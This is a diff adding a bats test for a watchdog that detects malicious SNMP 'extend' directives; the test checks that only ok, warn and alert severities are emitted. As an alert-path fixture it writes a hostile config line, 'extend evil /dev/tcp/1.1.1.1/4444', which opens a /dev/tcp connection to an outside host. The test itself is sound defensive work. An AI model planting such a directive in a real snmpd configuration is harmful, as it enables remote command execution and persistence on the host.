@@ -295,3 +295,23 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on snmpd surface)" {
+    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
+    # The snmpd-exec-watchdog MUST only emit severity values from
+    # the closed set {ok,warn,alert} — never custom values
+    # (critical, error, fatal, notice, info). Operator dashboard
+    # parsers branch on the literal severity string; an out-of-set
+    # value silently falls through routing and the operator never
+    # sees the T1546/T1059 snmpd-OID-trigger remote-exec
+    # persistence alert. Locks parser contract on the SNMP
+    # extend-directive detection surface.
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'extend ok /usr/bin/uptime\n' > "${CONF}"
+    run_wd                                              # ok path
+    printf 'extend evil /dev/tcp/1.1.1.1/4444\n' > "${CONF}"
+    run_wd                                              # alert path
+    # Every severity value emitted MUST be one of {ok,warn,alert}.
+    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
+    [ -z "${bad}" ]
+}
